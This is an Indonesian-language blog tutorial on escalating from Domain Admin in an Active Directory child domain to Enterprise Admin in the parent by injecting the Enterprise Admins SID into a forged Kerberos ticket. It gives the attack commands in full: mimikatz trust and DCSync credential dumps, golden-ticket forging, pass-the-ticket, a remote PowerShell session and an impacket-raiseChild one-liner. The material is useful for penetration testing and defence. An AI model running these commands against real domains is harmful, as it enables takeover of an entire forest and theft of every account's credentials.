---
title: "[Child Domain Trusts] Privilege Escalation Domain Admin to Enterprise Admin (SID Hijacking)"
author: "novran"
date: 2024-11-20 00:00:00 +0700
categories: [Active Directory Privilege Escalation]
tags: [Active Directory Privilege Escalation]
mermaid: true
image:
  path: /images/2024-11-20-abusing-child-domain-trusts-to-escalate-domain-admin-to-enterprise-admin-banner.png
  alt: Abusing Child Domain Trusts
---

SID Hijacking adalah teknik di mana penyerang memanfaatkan SID dari objek pengguna atau grup untuk mendapatkan hak istimewa yang lebih tinggi. Dengan ini penyerang memalsukan SID grup "Enterprise Admins" untuk meningkatkan hak istimewanya.

Konsep yang perlu dipahami:
- Dalam jaringan Active Directory, `Trust` adalah hubungan kepercayaan antar domain, seperti antara Parent Domain dan Child Domain.
- Dalam Active Directory, Group "Enterprise Admins" memiliki hak tertinggi (bahkan di atasnya Domain Admins).
- Security Identifier (SID) adalah identitas yang digunakan untuk mengelola hak akses dan izin pengguna atau grup.

**Persyaratan**

Penyerang **membutuhkan akses Domain Admin di Child Domain** untuk memulai eksploitasi. Kemudian penyerang memanipulasi akun pengguna atau grup di Child Domain, dengan cara menyisipkan SID grup "Enterprise Admins".

> Dari sini Parent Domain akan kita sebut sebagai `DC01` dan Child Domain akan kita sebut sebagai `DC02`.
> - **DC01** - `domain.local`
> - **DC02** - `child.domain.local`

----------

**Enumeration via Child Domain**

```powershell
get-adtrust -filter *
```

![Check ADTrust](/images/2024-11-20-abusing-child-domain-trusts-to-escalate-domain-admin-to-enterprise-admin-adtrust.png)

## Manual Exploitation (Local)

> To execute all of this, we need execute through **RDP!**

### 1. Run mimikatz.exe from DC02

Ekstrak informasi hubungan trust antar domain dan kredensialnya.

```
privilege::debug
lsadump::trust
lsadump::dcsync /all /csv
```

![Mimikatz LSADUMP](/images/2024-11-20-abusing-child-domain-trusts-to-escalate-domain-admin-to-enterprise-admin-mimikatz-gatherinfo.png)

Manipulasi tiket (Golden Ticket).

```
kerberos::golden /user:Administrator /domain:<CHILD.DOMAIN.LOCAL> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_DOMAIN_SID>-519
```

![Golden Ticket](/images/2024-11-20-abusing-child-domain-trusts-to-escalate-domain-admin-to-enterprise-admin-mimikatz-golden-ticket.png)

> Tambahkan `-519` pada akhiran `/sids:` menjadi `<PARENT_DOMAIN_SID>-519`

Pass the Ticket.

```
kerberos::ptt ticket.kirbi
```

![Pass the Ticket](/images/2024-11-20-abusing-child-domain-trusts-to-escalate-domain-admin-to-enterprise-admin-mimikatz-pass-the-ticket.png)

### 2. Enter PowerShell Session to DC01

Setelah berhasil mengeksekusi `Pass the Ticket`, Kita dapat memasuki sesi PowerShell DC01 melalui DC02 menggunakan Command di bawah ini.

```powershell
Enter-PSSession DC01
```

![Enter PowerShell Session](/images/2024-11-20-abusing-child-domain-trusts-to-escalate-domain-admin-to-enterprise-admin-pssession.png)

## Auto Exploitation (Remote)

```bash
impacket-raiseChild -target-exec <DOMAIN.LOCAL> -hashes :<DC02_ADMINISTRATOR_HASHES> '<CHILD.DOMAIN.LOCAL>/Administrator' -k
```
